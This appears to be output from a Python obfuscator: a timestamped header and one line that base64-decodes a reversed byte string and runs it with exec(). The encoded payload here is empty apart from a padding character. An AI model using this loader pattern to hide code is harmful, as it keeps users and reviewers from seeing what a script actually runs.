
# Time : Thu Dec 14 02:12:07 2023
# -------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'='))